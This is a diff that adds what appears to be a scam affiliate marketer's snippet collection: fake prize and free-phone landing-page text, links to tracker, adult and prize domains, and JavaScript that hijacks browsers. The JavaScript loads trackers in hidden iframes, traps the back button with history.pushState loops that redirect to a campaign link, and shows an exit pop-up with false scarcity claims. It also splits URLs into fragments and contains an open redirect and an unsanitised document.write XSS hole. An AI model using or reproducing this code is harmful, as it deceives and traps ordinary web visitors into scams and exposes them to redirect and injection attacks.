@@ -1,0 +1,144 @@
+https://focular-nuttack.com/click
+https://focular-nuttack.com/click/1
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/4.0.0/css/bootstrap.min.css">
+<script src="https://cdn.bootcss.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+<script src="https://shell-gift.website/static/jquery-2.1.4.min.js"></script>
+<link rel="stylesheet" href="https://shell-gift.website/static/bootstrap-4.min.css">
+<script src="https://shell-gift.website/static/bootstrap-4.min.js"></script>
+<link rel="stylesheet" href="https://shell-gift.website/static/bootstrap-3.min.css">
+<script src="https://shell-gift.website/static/bootstrap-3.min.js"></script>
+
+
+https://win-prize.vip/click.php?lp=1
+https://hot-flirt.online/click.php?lp=1
+https://win-prize.vip/click.php?lp=1&to_offer=1
+target="_blank" onclick="window.onbeforeunload=null;setTimeout('location.href=back_url',1000);this.href='https://win-prize.vip/click.php?lp=1';"
+
+
+
+<style>iframe {
+    visibility: hidden;
+    position: absolute;
+    left: 0; top: 0;
+    height:0; width:0;
+    border: none;
+	}</style>
+
+	<script>
+        u1 = "https://focular-nuttack.com";
+        u2 = "click/2";
+        document.write('<iframe src="' + u1 + "/" + u2 + '"></iframe>');
+    </script>
+
+
+<script type="text/javascript">
+! function () {
+var t;
+try {
+for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+onpopstate = function (t) {
+t.state&&location.replace("#")
+}
+} catch (o) {}
+}();
+</script>
+
+
+<script type="text/javascript">
+    var PreventExitPop = true;
+    function ExitPop() {
+    if (PreventExitPop != false) {
+        return "Are you sure you want to leave the page?\n\nThe offer is limited! If you close this window, your chance of winning a prize will be given to someone else!"
+    }
+}
+
+window.onbeforeunload = ExitPop;
+</script>
+
+
+function getURLParameter(name) {
+            return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)|| [,null])[1] || '');
+        }
+
+mobidea main:
+
+
+italy:
+1. Sarai indirizzato al sito Web dei nostri distributori certificati.
+2. Nella pagina successiva compila il modulo di spedizione con i tuoi dati di contatto.
+3. Apple iPhone XS sarà consegnato entro 5-7 giorni
+3. Il vostro Samsung Galaxy S9 sarà spedito entro due giorni lavorativi da DHL.
+
+<script> window._peq = window._peq || []; window._peq.push(["init"]); </script>
+    <script src="https://clientcdn.pushengage.com/core/3fd844e7b4aaddf96afaffef44fb6d11.js" async></script>
+
+
+function go() {
+            var url1 = "https://focular";
+            var url2 = "-nuttack.com/click";
+            var url = url1 + url2;
+            window.location.href = url;
+        }
+
+
+##############################   Monetizer
+<script src="https://shell-gift.website/push.js"></script>
+<script src="https://shell-gift.website/back.js"></script>
+<script src="https://freefuck.online/back.js"></script>
+
+    <script>
+        window.history.pushState('back.html', 'back', 'back.html');
+        window.history.pushState('index.html', 'Index', 'index.html');
+        window.addEventListener("popstate", function(e) {
+            if(document.URL.indexOf("back.html") >= 0){
+                document.location.href = document.location;
+            }
+        });
+    </script>
+<script>
+        function getParameterByName(name)
+        {
+            name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
+            var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+                results = regex.exec(location.search);
+            return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+        }
+        var imgNum = getParameterByName('imgNum');
+    </script>
+<script>document.write('<img src="' + imgNum + '.jpg" alt="girl" class="girl">')</script>
+// pop up
+popup
+
+var url = 'https://shell-track.com/?_lp=1&' + window.location.search.substring(1)
+
+<a href="javascript:void(0)" onclick="window.open(decodeURIComponent( window.location.href.substr(window.location.href.lastIndexOf('aref=')+5)), '_self');"> </a>
+
+      <script type="text/javascript">
+         ! function() {
+            var campaign_link = 'https://shell-track.com/skVLRQ'
+            var t;
+            try {
+               for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+               onpopstate = function(t) {
+                  t.state && location.replace(campaign_link)
+               }
+            } catch (o) {}
+         }();
+
+      </script>
+
+      <script>
+          $(document).ready(function () {
+             var url = 'https://shell-track.com/?_lp=1&' + window.location.search.substring(1)
+              $('.btn-send').each(function () {
+                  $(this).attr('href', url);
+              })
+          })
+      </script>
